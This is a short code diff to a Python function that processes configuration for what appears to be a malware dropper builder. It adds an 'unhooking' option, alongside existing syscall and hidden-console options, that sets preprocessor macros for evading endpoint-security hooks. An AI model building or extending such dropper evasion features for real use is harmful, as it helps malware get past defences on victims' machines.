@@ -61,6 +61,9 @@ def process_dropper_config(dropper_config):
     if dropper_config.get('syscalls'):
         dropper_config['preprocessing_macros'].append(dropper_config.get('syscalls').replace(' ', '_').upper())
         dropper_config['preprocessing_macros'].append("SYSCALL_ENABLED")
+    if dropper_config.get('unhooking'):
+        dropper_config['preprocessing_macros'].append(dropper_config.get('unhooking').replace(' ', '_').upper())
+        dropper_config['preprocessing_macros'].append("UNHOOKING_ENABLED")
 
     dropper_config['hide_console'] = dropper_config.get('hide_console')
 
